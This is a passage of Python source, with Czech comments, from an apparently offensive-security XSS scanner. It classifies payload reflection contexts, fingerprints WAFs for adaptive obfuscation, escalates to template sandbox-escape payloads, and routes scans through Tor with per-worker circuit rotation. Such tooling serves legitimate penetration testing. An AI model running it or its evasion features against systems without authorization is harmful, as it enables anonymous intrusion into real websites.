        # že payload obsahoval `"` nebo `'` jako breakout — jinak je to
        # jen JS string s textem (false positive).
        # Najdi nejbližší " nebo ' před markerem (uvnitř script bloku)
        script_segment = body[script_start_pos:idx]
        # Spočítej nezakódované " a ' v segmentu (jednoduchý heuristic)
        # Pokud lichý počet (otevřené uvozovky), payload je v JS stringu
        # Toto je nepřesné, ale pro většinu případů funkční
        # POZNÁMKA: spolehlivější by byl JS parser, ale to je out of scope
        unescaped_dquotes = len(re.findall(r'(?<!\\)"', script_segment))
        unescaped_squotes = len(re.findall(r"(?<!\\)'", script_segment))

        in_string = (unescaped_dquotes % 2 == 1) or (unescaped_squotes % 2 == 1)

        if in_string:
            # Payload je uvnitř JS stringu. Aby byl spustitelný, musí obsahovat
            # uvozovku odpovídajícího typu — jinak je to jen text uvnitř stringu.
            payload_chars = _payload_breakout_chars(payload)
            if '"' not in payload_chars and "'" not in payload_chars:
                logging.debug(f"[FP-DETECT] payload in JS string without quote breakout")
                return "js_string"

        return "script_body"

    # Po klasifikaci scripttag/komentář dále hledáme specifické kontexty
    # — použijeme `found_needle` = co jsme reálně našli v body (marker nebo payload)
    found_needle = marker if (marker and marker in body) else payload

    # ── 4. Event handler → KRITICKÝ ───────────────────────────────────────────
    snippet = body[max(0, idx - 300):idx + 300]
    if re.search(
        r'\bon\w+\s*=\s*["\']?[^"\'>\n]*' + re.escape(found_needle[:10]),
        snippet, re.I
    ):
        return "event_handler"

    # ── 5. href/src/action/data atribut → ZÁVAŽNÝ ────────────────────────────
    if re.search(
        r'\b(?:href|src|action|data)\s*=\s*["\']?' + re.escape(found_needle[:10]),
        snippet, re.I
    ):
        return "href_attr"

    # ── 6. Tag-creating payload → KRITICKÝ (priorita před html_attr) ──────────
    # Pokud payload sám obsahuje executable HTML tag a prošel raw, je to
    # plnohodnotný XSS injection — ne reflexe v existujícím atributu.
    # MUSÍ být před html_attr kontrolou, jinak by byl falešně klasifikován
    # jako html_attr (protože payload <svg onload=...> sám obsahuje "=" znak).
    payload_lower = payload.lower()
    if any(tag in payload_lower for tag in ('<script', '<svg', '<img', '<image',
                                              '<iframe', '<body', '<object',
                                              '<embed', '<details', '<marquee',
                                              '<input', '<form', '<style',
                                              '<video', '<audio', '<source',
                                              '<button', '<textarea', '<select',
                                              '<link', '<meta', '<base',
                                              '<math', '<xml', '<applet',
                                              '<xss', '<xss/>',
                                              '<a href', '<a ')):
        return "script_body"

    # ── 7. Obecný HTML atribut ────────────────────────────────────────────────
    tag_start = body.rfind("<", 0, idx)
    tag_end   = body.find(">", idx)
    if tag_start != -1 and tag_end != -1 and tag_end > idx:
        tag_content = body[tag_start:tag_end]
        if "=" in tag_content:
            return "html_attr"

    # ── 8. Volný HTML kontext ─────────────────────────────────────────────────
    return "html_body"


# ─────────────────────────────────────────────────────────────────────────────
# PUBLIC CLASSIFIER — deleguje na Context Engine, fallback na legacy regex
# ─────────────────────────────────────────────────────────────────────────────

def classify_reflection_context(body: str, payload: str,
                                 marker: str = None) -> Optional[str]:
    """
    Public classifier for reflection context.

    Priorita:
    1) context_engine.classify_reflection_context_v2 (parser-based, přesná)
    2) _classify_reflection_context_legacy (regex, fallback)

    Oba vrací stejnou sadu string hodnot, takže všechna existující volání
    v worker_task / inject_post_for_stored / main() fungují beze změny.
    """
    if _CONTEXT_ENGINE_AVAILABLE and _ce_classify_v2 is not None:
        try:
            return _ce_classify_v2(body, payload, marker)
        except Exception as e:
            logging.warning("[context_engine] classify failed (%s) — "
                           "degrading to legacy regex classifier", e)
    return _classify_reflection_context_legacy(body, payload, marker)


def classify_reflection_context_rich(body: str, payload: str,
                                      marker: str = None):
    """
    Rich verze — vrací ReflectionContext objekt s context, sub_context,
    severity, breakout_required, confidence a evidence. Jen když je
    context_engine dostupný; jinak None.

    Použití pro reporting / payload bank selection:
        rich = classify_reflection_context_rich(body, payload, marker)
        if rich and rich.severity == _CtxSeverity.CRITICAL:
            ...
    """
    if _CONTEXT_ENGINE_AVAILABLE and _ce_analyze is not None:
        try:
            return _ce_analyze(body, marker or payload, payload)
        except Exception as e:
            logging.debug("[context_engine] rich analyze failed: %s", e)
    return None


def _map_rich_context_to_probe_bank(rich_ctx) -> str:
    """
    Mapuje ReflectionContext na payload-bank key používaný v get_context_payloads():
    'html' | 'attr' | 'script' | 'url'.

    Používá se v context_probe() pro přesnější výběr payload banky.
    """
    if rich_ctx is None or _CtxFamily is None:
        return "html"
    ctx = rich_ctx.context
    sub = rich_ctx.sub_context
    if ctx == _CtxFamily.JS or ctx == _CtxFamily.HTML_RAWTEXT:
        return "script"
    if ctx == _CtxFamily.URL:
        return "url"
    if ctx == _CtxFamily.HTML_ATTR:
        if sub == _CtxSub.ATTR_EVENT_HANDLER or sub == _CtxSub.ATTR_SRCDOC:
            return "script"
        if sub == _CtxSub.ATTR_URL:
            return "url"
        return "attr"
    if ctx == _CtxFamily.CSS:
        return "attr"   # CSS není v legacy bankách, použij attr jako nejbližší
    return "html"


def _log_context_engine_status():
    """Jednorázově zaloguj stav context_engine při prvním volání."""
    global _CONTEXT_ENGINE_LOGGED
    try:
        _CONTEXT_ENGINE_LOGGED
    except NameError:
        _CONTEXT_ENGINE_LOGGED = False
    if _CONTEXT_ENGINE_LOGGED:
        return
    if _CONTEXT_ENGINE_AVAILABLE:
        logging.info("[context_engine] active — parser-based context classification")
    else:
        logging.info("[context_engine] not available — using legacy regex classifier. "
                    "Install: pip install esprima tree-sitter tree-sitter-javascript tree-sitter-html")
    _CONTEXT_ENGINE_LOGGED = True


def worker_task(session: requests.Session,
                task: Tuple[str, str, str, str],
                timeout: float,
                sleep_between: float,
                found_params: Set[Tuple[str, str]],
                found_lock: Lock,
                early_exit: bool,
                print_lock: Lock,
                marker_param: str,
                verbose: bool,
                follow_redirects: bool,
                candidates: list,
                cand_lock: Lock,
                csp_result: CSPAnalysisResult,
                waf_seen: Set[str],
                waf_seen_lock: Lock,
                waf_by_host: Dict,
                callbacks: Dict[str, Callable],
                cancel_event=None):
    # Bail BEFORE any network work if the scan was cancelled. The seed-scan
    # phase keeps a window of workers*4 futures in-flight; without this check a
    # Stop had to wait for that whole window to run its HTTP requests to
    # completion (the "it keeps going after Stop" symptom). Queued-but-not-
    # started tasks now return instantly; only the ~workers already mid-request
    # finish. worker_task is module-level (can't see run_scan's _cancelled), so
    # the event is passed in explicitly.
    if cancel_event is not None and cancel_event.is_set():
        return None
    url, param, payload_to_send, marker = task
    cb = callbacks                                  # ← 2. přidat

    # DEBUG: log first few calls
    try:
        import os as _dos
        _dp = _dos.path.join(_dos.path.dirname(_dos.path.abspath(__file__)), "xss_debug_gui.log") if _GUI_DEBUG_LOG else _dos.devnull
        with open(_dp, "a") as _df:
            _df.write(f"{time.time():.3f} [WORKER] url={url[:60]} param={param} cb_type={type(cb.get('on_hit','')).__name__}\n")
            _df.flush()
    except: pass

    if early_exit:
        with found_lock:
            if (url, param) in found_params:
                return None

    extra = {marker_param: marker} if marker else None
    test_url = inject_into_params(url, param, payload_to_send, extra_params=extra)
    if not test_url:
        return None

    if verbose:
        cb["on_log"](f"[VERB] Requesting: {test_url}", "debug")  # ← 3. nahradit print

    resp = perform_request(session, test_url, timeout, follow_redirects)
    if sleep_between > 0:
        time.sleep(sleep_between)

    if resp is _REQUEST_FAILED:
        return _REQUEST_FAILED  # propaguj nahoru → circuit breaker v scan loopu

    if not resp:
        return None

    status = resp.status_code
    body   = resp.text or ""

    # ── 3xx handling ─────────────────────────────────────────────────────────
    # Redirect body sám o sobě prohlížeč nerenderuje — payload v <a href> nebo
    # <meta refresh> uvnitř redirect stránky NENÍ XSS. Toto byla hlavní příčina
    # tisíců false positives na example.org/clanek?nazev=... (každý request → 301).
    # POSTUP: pokud je redirect v rámci stejného scope (example.org → www.example.org),
    # následuj ho ručně a analyzuj finální response. Cross-domain redirecty
    # ignoruj.
    if 300 <= status < 400 and not follow_redirects:
        # Fingerprint WAF z headers (i bez body analýzy)
        waf_early = fingerprint_waf(resp)
        if waf_early:
            waf_host = urlparse(test_url).hostname or test_url
            with waf_seen_lock:
                if waf_host not in waf_seen:
                    waf_seen.add(waf_host)
                    waf_by_host[waf_host] = waf_early
                    cb["on_waf"]({
                        "name":       waf_early["name"],
                        "host":       waf_host,
                        "confidence": waf_early["confidence"],
                        "reason":     waf_early.get("reason", ""),
                    })
            # v10.7: remember detection for adaptive obfuscation
            _waf_remember_detection(waf_host, waf_early["name"])

        # Pokus o follow in-scope redirectu
        location = resp.headers.get("Location", "")
        if location:
            follow_url = requests.compat.urljoin(test_url, location)
            orig_host = (urlparse(test_url).hostname or "").lower()
            follow_host = (urlparse(follow_url).hostname or "").lower()
            if _hosts_match(follow_host, orig_host):
                # In-scope redirect — pošli na finální URL
                resp2 = perform_request(session, follow_url, timeout, follow_redirects=True)
                if resp2 is not None:
                    resp = resp2
                    status = resp.status_code
                    body = resp.text or ""
                    test_url = follow_url
                    # Pokračuj dál do reflection check
                else:
                    return None
            else:
                # Cross-domain redirect — mimo scope, ignoruj
                return None
        else:
            # 3xx bez Location headeru — nic víc nedělej
            return None

    if verbose:
        snippet = (body[:VERBOSE_SNIPPETS]).replace("\n", "\\n")
        cb["on_log"](f"[VERB] Snippet: {snippet}", "debug")

    waf = fingerprint_waf(resp)
    if waf:
        waf_host = urlparse(test_url).hostname or test_url
        # v10.7: remember detection for adaptive obfuscation
        _waf_remember_detection(waf_host, waf["name"])
        with waf_seen_lock:
            if waf_host not in waf_seen:
                waf_seen.add(waf_host)
                waf_by_host[waf_host] = waf
                try:
                    import os as _dos
                    _dp = _dos.path.join(_dos.path.dirname(_dos.path.abspath(__file__)), "xss_debug_gui.log") if _GUI_DEBUG_LOG else _dos.devnull
                    with open(_dp, "a") as _df:
                        _df.write(f"{time.time():.3f} [ENGINE] BEFORE on_waf: {waf['name']} host={waf_host}\n"); _df.flush()
                except: pass
                cb["on_waf"]({
                    "name":       waf["name"],
                    "host":       waf_host,
                    "confidence": waf["confidence"],
                    "reason":     waf.get("reason", ""),
                })
        # WAF-blocked hit: 307/302 + WAF detekován = WAF zablokoval payload
        if status in (307, 302, 303):
            with found_lock:
                already = (url, param) in found_params
                found_params.add((url, param))
            if not already:
                csp_note = csp_affects_finding(csp_result, "waf_block")
                _emit_hit(cb, {
                    "url":      test_url,
                    "param":    param,
                    "context":  f"WAF_BLOCK ({waf['name']})",
                    "csp_note": csp_note,
                    "status":   status,
                    "waf":      waf,
                    "source":   "seed_waf",
                    "payload":  payload_to_send,
                }, body=body, resp_headers=getattr(resp, "headers", None))
            return (test_url, param, status, len(body), waf)

    nbody = normalize_text(body)

    if not body_contains_reflection(body, payload_to_send, marker or None):
        if not body_contains_reflection(nbody, payload_to_send, marker or None):
            reason = has_candidate_signals(nbody, payload_to_send, status)
            if reason:
                with cand_lock:
                    candidates.append({"url": url, "param": param, "reason": reason})
            return None

    # Rich context analýza — pokud je engine dostupný, získej detailní info
    # (sub_context, severity, breakout_required, evidence) pro reporting v GUI.
    _rich_context = None
    if _CONTEXT_ENGINE_AVAILABLE:
        try:
            _rich_context = classify_reflection_context_rich(
                body, payload_to_send, marker or None)
        except Exception:
            _rich_context = None

    # Legacy string klasifikace (pro backward-compat filtry níže)
    if _rich_context is not None:
        from context_engine import legacy_string as _legacy_string
        context = _legacy_string(_rich_context)
    else:
        context = classify_reflection_context(body, payload_to_send, marker or None)

    if context in ("html_escaped", "html_comment", "js_string"):
        logging.debug(f"[FP-SKIP] {test_url} param:{param} context:{context}")
        with cand_lock:
            candidates.append({"url": url, "param": param, "reason": f"Sanitized ({context})"})
        return None

    if context is None:
        return None

    # DEBUG: log every reflection with context
    try:
        import os as _dos
        _dp = _dos.path.join(_dos.path.dirname(_dos.path.abspath(__file__)), "xss_debug_gui.log") if _GUI_DEBUG_LOG else _dos.devnull
        with open(_dp, "a") as _df:
            _rich_info = ""
            if _rich_context:
                _rich_info = (f" [rich: {_rich_context.context.value}/"
                             f"{_rich_context.sub_context.value} "
                             f"sev={_rich_context.severity.value} "
                             f"conf={_rich_context.confidence:.2f} "
                             f"parsers=html:{_rich_context.evidence.parser_used}"
                             f"/js:{_rich_context.evidence.js_parser_used}]")
            _df.write(f"{time.time():.3f} [ENGINE] GOT CONTEXT: url={url[:60]} "
                     f"param={param} ctx={context}{_rich_info}\n")
            _df.flush()
    except: pass

    # ════════════════════════════════════════════════════════════════════════
    # v2 GATE — render-aware + exploit-classifier + content-type downgrade
    # ════════════════════════════════════════════════════════════════════════
    # Goal: reject false positives like example.com case BEFORE on_hit.
    # Three checks:
    #   (1) static payload classification — does payload have any exec primitive?
    #   (2) dynamic response classification — what survived in response?
    #   (3) content-type renderability — is this body even browser-rendered?
    # If gate says "not XSS", finding is downgraded or rejected.
    _gate_verdict = None
    _gate_severity = None
    _gate_klass = None
    _gate_renderability = None
    _gate_skip_reason = None
    if _CONTEXT_ENGINE_AVAILABLE and _rich_context is not None:
        try:
            from context_engine import (
                classify_payload_static as _ce_static,
                classify_response as _ce_dyn,
                merge_static_dynamic as _ce_merge,
                classify_response_renderability as _ce_rend,
                apply_downgrade as _ce_down,
            )
            # 1) Static + dynamic exploit classification
            static_v = _ce_static(payload_to_send or "")
            dyn_v = _ce_dyn(body, payload_to_send or "")
            merged = _ce_merge(static_v, dyn_v)
            _gate_klass = merged.klass.value
            _gate_severity = merged.severity

            # 2) Content-Type aware downgrade
            ct_header = ""
            try:
                ct_header = (resp.headers.get("Content-Type", "") or "").strip()
            except Exception:
                ct_header = ""
            _gate_renderability = _ce_rend(ct_header, body=body)

            new_sev, ds_notes = _ce_down(merged.severity, _gate_renderability)
            if new_sev != merged.severity:
                _gate_severity = new_sev

            _gate_verdict = {
                "klass":         merged.klass.value,
                "severity":      _gate_severity,
                "confidence":    merged.confidence,
                "primitives":    merged.primitives,
                "rationale":     merged.rationale,
                "renderability": _gate_renderability.renderability.value,
                "content_type":  _gate_renderability.content_type,
                "downgrade_notes": ds_notes,
            }

            # Log decision visibly
            try:
                cb["on_log"](
                    f"[GATE] {param} → klass={_gate_klass} sev={_gate_severity} "
                    f"render={_gate_renderability.renderability.value} "
                    f"ct={_gate_renderability.content_type} "
                    f"({merged.rationale[:60]})",
                    "info"
                )
            except Exception:
                pass

            # 3) Decision: reject hard if non-HTML response with no exec primitive
            #    AND tag/text-only classification
            is_non_html = _gate_renderability.renderability.value not in (
                "html_rendered", "javascript_response", "unknown")
            if is_non_html and merged.klass.value in ("text_only", "tag_injection"):
                _gate_skip_reason = (
                    f"non_html_response({_gate_renderability.content_type})"
                    f"_with_{merged.klass.value}"
                )
            elif merged.klass.value == "text_only" and not is_non_html:
                # Even on HTML response, pure text reflection without any
                # markup primitive is informational only
                _gate_skip_reason = "text_only_reflection_no_primitive"

        except Exception as _gate_err:
            # Gate must NEVER break the scanner — log and continue with old behavior
            try:
                cb["on_log"](
                    f"[GATE] error ({type(_gate_err).__name__}: {_gate_err}) "
                    f"— falling through to legacy behavior",
                    "warning"
                )
            except Exception:
                pass

    # If gate rejected, log as candidate and skip on_hit
    if _gate_skip_reason:
        try:
            with cand_lock:
                candidates.append({
                    "url":    url,
                    "param":  param,
                    "reason": f"gate_rejected: {_gate_skip_reason}",
                    "gate":   _gate_verdict,
                })
        except Exception as _cae:
            _swallow(_cae, "append gate-rejected candidate")
        return None
    # ════════════════════════════════════════════════════════════════════════

    # ════════════════════════════════════════════════════════════════════════
    # TEMPLATE INJECTION FOLLOW-UP PROBE
    # ════════════════════════════════════════════════════════════════════════
    # If response body shows a framework signature (Angular/Vue/etc.), and our
    # reflection passed the gate, send 1-3 framework-specific sandbox-escape
    # payloads as a follow-up probe. This catches template injection that
    # doesn't require any HTML markup primitive — pure {{...}} expressions
    # that the framework will evaluate.
    #
    # Cost: 1-3 extra HTTP requests per UNIQUE finding (after dedup).
    # ════════════════════════════════════════════════════════════════════════
    _template_finding = None
    if _TEMPLATE_INJECTION_AVAILABLE and _ti_detect_framework is not None:
        try:
            fw_info = _ti_detect_framework(body)
            if fw_info.framework != _TIFramework.UNKNOWN and fw_info.confidence >= 0.7:
                # v10.16: ARITHMETIC DETECTION PROBE — než vystřelíme sandbox-
                # escape exploit payloady, ověříme NEŠKODNÝM aritmetickým
                # výrazem, jestli engine vstup REÁLNĚ vyhodnocuje. {{a*b}} s
                # náhodnými operandy: když se ve výstupu objeví součin (a ne
                # literál), je to deterministický důkaz template-eval injection.
                # Snižuje false-negatives (chytne enginy, kde basic eval projde,
                # ale konkrétní escape se neodrazí čistě) i false-positives
                # (náhodné operandy → součin se náhodou nevyskytuje na stránce).
                _arith_confirmed = False
                if _ti_arith_probes is not None and _ti_arith_check is not None:
                    try:
                        # Require ≥2 DISTINCT arithmetic probes (different operand
                        # pairs → different products) to evaluate. A real template
                        # engine evaluates them all; a single product number can
                        # appear on the page by coincidence (price/ID/timestamp),
                        # so confirming on ONE match (the old break-on-first) was a
                        # false positive. Two specific products both coinciding is
                        # effectively impossible.
                        _arith_hits = 0
                        _arith_last = None
                        for _ap in _ti_arith_probes()[:3]:  # 3 různé operandy
                            _ap_url = inject_into_params(url, param, _ap.payload,
                                                         extra_params=None)
                            if not _ap_url:
                                continue
                            _ap_resp = _fetch_with_tor_retry(session, _ap_url,
                                                             timeout, max_attempts=1)
                            if _ap_resp is None:
                                continue
                            if _ti_arith_check(_ap_resp.text or "", _ap):
                                _arith_hits += 1
                                _arith_last = _ap
                        if _arith_hits >= 2:
                            _arith_confirmed = True
                            cb["on_log"](
                                f"[CSTI] {param} → template engine evaluates "
                                f"input ({_arith_hits} distinct products confirmed, "
                                f"e.g. {_arith_last.notes} → {_arith_last.sentinel}) "
                                f"[{fw_info.framework.value}] — confirmed "
                                f"injection point, escalating to exploit "
                                f"payloads.", "info")
                    except Exception as _ae:
                        _swallow(_ae, "CSTI arithmetic probe")
                # Framework confirmed. Get bank & try ONE high-confidence payload.
                # v10.16: version-aware výběr — když detekujeme verzi
                # frameworku (např. AngularJS 1.5.x), pošli jen payloady
                # relevantní pro tu verzi místo celé historické "shotgun"
                # sady (méně requestů, méně šumu). Fallback na plný bank
                # když verze není známá.
                if _ti_payload_bank_ver is not None and fw_info.version:
                    bank = _ti_payload_bank_ver(fw_info.framework, fw_info.version)
                else:
                    bank = _ti_payload_bank(fw_info.framework)
                if bank:
                    # Pick the universal "constructor.constructor" probe — works
                    # on most sandbox-equipped frameworks
                    probe_payload = bank[0].payload   # most generic first

                    # Build test URL
                    probe_url = inject_into_params(url, param, probe_payload, extra_params=None)
                    if probe_url:
                        try:
                            probe_resp = session.get(probe_url, timeout=timeout, allow_redirects=True)
                            probe_body = probe_resp.text or ""
                            # If sentinel "alert(1)" appears as plain TEXT in
                            # response — that's not exec, it's just reflection
                            # of our payload. Real exec verification needs
                            # Playwright. For now: classify reflection context.
                            ti_verdict = _ti_classify(probe_body, probe_payload[:32], probe_payload)
                            # v10.16: nález hlásíme když JE arithmetic-confirmed
                            # (silný deterministický důkaz eval) NEBO reflection
                            # context říká template_evaluable. Arith confirmation
                            # zvyšuje confidence a chytne i případy, kde context
                            # klasifikátor váhá.
                            _evaluable = (ti_verdict and ti_verdict.template_evaluable) \
                                or _arith_confirmed
                            if _evaluable:
                                _ti_conf = (ti_verdict.confidence if ti_verdict else 0.0)
                                if _arith_confirmed:
                                    # deterministický důkaz → vysoká confidence
                                    _ti_conf = max(_ti_conf, 0.95)
                                _template_finding = {
                                    "framework":      fw_info.framework.value,
                                    "version":        fw_info.version,
                                    "fw_confidence":  fw_info.confidence,
                                    "expression_context": (ti_verdict.expression_context
                                                           if ti_verdict else "arithmetic-eval"),
                                    "ti_confidence":  _ti_conf,
                                    "arith_confirmed": _arith_confirmed,
                                    "rationale":      (ti_verdict.rationale if ti_verdict else
                                                       "Arithmetic expression evaluated by template engine"),
                                    "probe_payload":  probe_payload,
                                    "probe_url":      probe_url,
                                }
                                cb["on_log"](
                                    f"[TEMPLATE-INJ] {fw_info.framework.value} "
                                    f"detected on {param} → "
                                    f"{_template_finding['expression_context']} "
                                    f"context (conf={_ti_conf:.2f}"
                                    f"{', arith-confirmed' if _arith_confirmed else ''})",
                                    "info"
                                )
                        except Exception:
                            pass
        except Exception as _ti_err:
            try:
                cb["on_log"](f"[TEMPLATE-INJ] error: {type(_ti_err).__name__}: {_ti_err}", "debug")
            except Exception:
                pass
    # ════════════════════════════════════════════════════════════════════════

    with found_lock:
        already = (url, param) in found_params
        found_params.add((url, param))

    # DEBUG
    try:
        with open(_dp, "a") as _df:
            _df.write(f"{time.time():.3f} [ENGINE] already={already} url={url[:60]} param={param}\n")
            _df.flush()
    except: pass

    if not already:
        try:
            csp_note = csp_affects_finding(csp_result, context)
            # Použij detekovaný WAF pro daný host pokud worker nedetekoval
            _wh = urlparse(test_url).hostname or ""
            _eff_waf = waf or waf_by_host.get(_wh)

            # Viditelný log o tom, že parser-based engine klasifikoval hit
            if _rich_context is not None:
                cb["on_log"](
                    f"[CONTEXT] {param} → {_rich_context.context.value}/"
                    f"{_rich_context.sub_context.value} "
                    f"(severity={_rich_context.severity.value}, "
                    f"conf={_rich_context.confidence:.2f}, "
                    f"parser={_rich_context.evidence.parser_used}"
                    + (f"+{_rich_context.evidence.js_parser_used}"
                       if _rich_context.evidence.js_parser_used else "")
                    + ")",
                    "info"
                )

            # DEBUG
            try:
                import os as _dos
                _dp = _dos.path.join(_dos.path.dirname(_dos.path.abspath(__file__)), "xss_debug_gui.log") if _GUI_DEBUG_LOG else _dos.devnull
                with open(_dp, "a") as _df:
                    _df.write(f"{time.time():.3f} [ENGINE] BEFORE on_hit: url={test_url[:80]} ctx={context}\n")
                    _df.flush()
            except: pass
            _emit_hit(cb, {
                "url":      test_url,
                "param":    param,
                "context":  context,
                "csp_note": csp_note,
                "status":   status,
                "waf":      _eff_waf,
                "source":   "seed",
                "payload":  payload_to_send,
                # Rich context info — dostupné jen když je context_engine aktivní.
                "rich_context":     (_rich_context.context.value
                                     if _rich_context else None),
                "rich_sub_context": (_rich_context.sub_context.value
                                     if _rich_context else None),
                "rich_severity":    (_rich_context.severity.value
                                     if _rich_context else None),
                "rich_breakout":    (sorted(_rich_context.breakout_required)
                                     if _rich_context else None),
                "rich_confidence":  (round(_rich_context.confidence, 2)
                                     if _rich_context else None),
                "rich_element":     (_rich_context.evidence.element_tag
                                     if _rich_context else None),
                "rich_attr":        (_rich_context.evidence.attribute_name
                                     if _rich_context else None),
                # v2 GATE info pre-computed in worker_task — _emit_hit will
                # also run gate but it's idempotent. We pass these through
                # for downstream consumers.
                "gate_klass":         _gate_klass,
                "gate_severity":      _gate_severity,
                "gate_renderability": (_gate_renderability.renderability.value
                                       if _gate_renderability else None),
                "gate_content_type":  (_gate_renderability.content_type
                                       if _gate_renderability else None),
                "gate_verdict":       _gate_verdict,
                # Template injection follow-up — None when no framework or no eval risk.
                "template_injection": _template_finding,
            }, body=body, resp_headers=getattr(resp, "headers", None),
               run_active_probe=True)
            try:
                with open(_dp, "a") as _df:
                    _df.write(f"{time.time():.3f} [ENGINE] AFTER on_hit OK\n")
                    _df.flush()
            except: pass
        except Exception as _e:
            try:
                import os as _dos, traceback as _tb
                _dp = _dos.path.join(_dos.path.dirname(_dos.path.abspath(__file__)), "xss_debug_gui.log") if _GUI_DEBUG_LOG else _dos.devnull
                with open(_dp, "a") as _df:
                    _df.write(f"{time.time():.3f} [ENGINE] EXCEPTION in not-already block: {_e}\n")
                    _df.write(_tb.format_exc())
                    _df.flush()
            except: pass

    return (test_url, param, status, len(body), waf)
 
# ══════════════════════════════════════════════════════════════════════════════
# ── TOR INTEGRATION ──────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
#
# Robustní Tor controller s:
#   - Auto-discovery autentifikační metody (NONE/PASSWORD/COOKIE/SAFECOOKIE)
#     přes stem package (oficiální Tor Python library)
#   - Rate-limited NEWNYM (Tor ignoruje < 10s intervals — respektujeme to)
#   - Exit IP verifikace přes check.torproject.org
#   - Per-worker circuit isolation přes SOCKS5 user/pass
#   - DNS přes Tor (socks5h://) — žádné DNS leaky
#
# Použití:
#     tor = TorController(password="optional_tor_password")
#     if tor.detect():
#         proxies = tor.requests_proxies()
#         # nebo per-worker:
#         proxies = tor.requests_proxies(worker_id=3)  # izolovaný okruh
#         session = make_session(proxies=proxies)
#         ip = tor.verify_exit_ip(session)
#         ...
#         tor.rotate()  # NEWNYM, respektuje 10s rate limit
#
# Fallback: pokud stem není nainstalovaný, TorController použije raw socket
# protokol (funguje jen pro no-auth ControlPort — starý chování).
# ══════════════════════════════════════════════════════════════════════════════

class TorController:
    """
    Robustní Tor controller pro XSS scanner.
    Thread-safe, podporuje všechny 3 Tor auth metody přes stem.
    """

    # Tor default MaxCircuitDirtiness = 10 min, NEWNYM rate-limit = ~10s
    MIN_ROTATE_INTERVAL = 10.0

    # check.torproject.org endpoint
    TOR_CHECK_API = "https://check.torproject.org/api/ip"

    def __init__(self,
                 control_port: int = 9051,
                 socks_port: int = 9050,
                 password: Optional[str] = None,
                 host: str = "127.0.0.1"):
        self.host = host
        self.control_port = control_port
        self.socks_port = socks_port
        self.password = password
        self._controller = None
        self._last_rotate = 0.0
        self._lock = Lock()
        self._enabled = False
        self._exit_ip: Optional[str] = None
        self._auth_method: Optional[str] = None
        self._stem_available = False

    # ── Detection ─────────────────────────────────────────────────────

    def detect(self) -> bool:
        """
        Pokusí se připojit k Tor ControlPort a autentizovat.
        Pokud je stem nainstalovaný, auto-detekuje auth method.
        Bez stem jen ověří, že SOCKS port odpovídá.

        Returns True pokud je Tor dostupný A autorizace proběhla.
        """
        # Nejprve základní TCP check — je Tor vůbec běží?
        if not self._is_port_open(self.socks_port):
            logging.debug(f"Tor SOCKS port {self.socks_port} unavailable")
            return False

        # Zkus stem pro kontrolu auth
        try:
            import stem
            from stem import Signal as _Signal
            from stem.control import Controller as _StemController
            self._stem_available = True
        except ImportError:
            logging.warning(
                "[!]️  'stem' package is not installed — the Tor controller will have "
                "limited functionality. Recommended: pip install stem"
            )
            self._stem_available = False

        if self._stem_available:
            try:
                import stem
                from stem.control import Controller as _StemController
                self._controller = _StemController.from_port(
                    address=self.host, port=self.control_port
                )
                # Stem auto-detekuje metodu: NONE / PASSWORD / COOKIE / SAFECOOKIE
                self._controller.authenticate(password=self.password)
                # Zjisti kterou metodu použil (pro logging)
                try:
                    proto = self._controller.get_protocolinfo()
                    self._auth_method = ",".join(proto.auth_methods) if proto else "?"
                except Exception:
                    self._auth_method = "unknown"
                self._enabled = True
                logging.info(f"[OK] Tor controller authenticated (auth: {self._auth_method})")
                return True
            except stem.SocketError as e:
                logging.error(f"[ERR] Tor ControlPort {self.control_port} unavailable: {e}")
                return False
            except stem.connection.MissingPassword:
                logging.error(
                    f"[ERR] Tor ControlPort {self.control_port} requires a password. "
                    "Pass --tor-password <password>"
                )
                return False
            except stem.connection.PasswordAuthRejected:
                logging.error(
                    f"[ERR] Tor ControlPort: heslo neshoda. Zkontroluj HashedControlPassword v torrc."
                )
                return False
            except stem.connection.CookieAuthRejected as e:
                logging.error(
                    f"[ERR] Tor CookieAuthentication selhalo: {e} "
                    "(the process may be unable to read the cookie file)"
                )
                return False
            except Exception as e:
                logging.debug(f"Tor detect: unexpected error: {e}")
                # Controller nepotřebujeme — SOCKS stále může fungovat
                self._enabled = False
                return False
        else:
            # Fallback: stem není nainstalovaný → raw socket check
            if not self._is_port_open(self.control_port):
                logging.warning(
                    "[!]️  Tor ControlPort unavailable — NEWNYM rotation will not work"
                )
                self._enabled = False
            else:
                self._enabled = True
                logging.info("[OK] Tor SOCKS available (control port OK, no auth check)")
            return True

    def _is_port_open(self, port: int) -> bool:
        import socket as _socket
        try:
            with _socket.create_connection((self.host, port), timeout=1.5):
                return True
        except Exception:
            return False

    # ── Proxies ───────────────────────────────────────────────────────

    def requests_proxies(self, worker_id: Optional[int] = None) -> Dict[str, str]:
        """
        Vrátí dict pro requests session.proxies.
        socks5h:// znamená DNS přes Tor (no DNS leak).

        Pokud worker_id je zadán, použije SOCKS5 auth pro circuit isolation —
        každý worker dostane vlastní exit node. Vyžaduje IsolateSOCKSAuth
        v torrc (default zapnuté).
        """
        if worker_id is not None:
            # Unikátní username per worker = izolovaný okruh
            user = f"xsg_w{worker_id}"
            pwd = "x"  # hodnota nezáleží, jen musí existovat
            proxy = f"socks5h://{user}:{pwd}@{self.host}:{self.socks_port}"
        else:
            proxy = f"socks5h://{self.host}:{self.socks_port}"
        return {"http": proxy, "https": proxy}

    # ── Verification ──────────────────────────────────────────────────

    def verify_exit_ip(self, session: Optional[requests.Session] = None,
                        timeout: float = 10.0) -> Optional[str]:
        """
        Zkontroluje přes check.torproject.org, že traffic skutečně jde přes Tor.
        Vrátí exit IP, nebo None při selhání.
        """
        try:
            if session is None:
                session = requests.Session()
                session.proxies.update(self.requests_proxies())
                session.verify = False
            r = session.get(self.TOR_CHECK_API, timeout=timeout)
            data = r.json()
            if data.get("IsTor"):
                self._exit_ip = data.get("IP")
                return self._exit_ip
            else:
                logging.error(
                    "[!]️  check.torproject.org says the traffic does NOT go through Tor! "
                    "Zkontroluj proxies setup."
                )
                return None
        except Exception as e:
            logging.error(f"[ERR] Tor exit IP check selhal: {e}")
            return None

    @property
    def exit_ip(self) -> Optional[str]:
        return self._exit_ip

    # ── Circuit rotation ──────────────────────────────────────────────

    def rotate(self, force: bool = False) -> bool:
        """
        Rotuje Tor okruh (NEWNYM). Respektuje MIN_ROTATE_INTERVAL —
        Tor by rychlé volání stejně ignoroval.

        Returns True pokud rotace proběhla, False pokud byla skipnutá
        (rate limit) nebo selhala.
        """
        with self._lock:
            now = time.time()
            elapsed = now - self._last_rotate
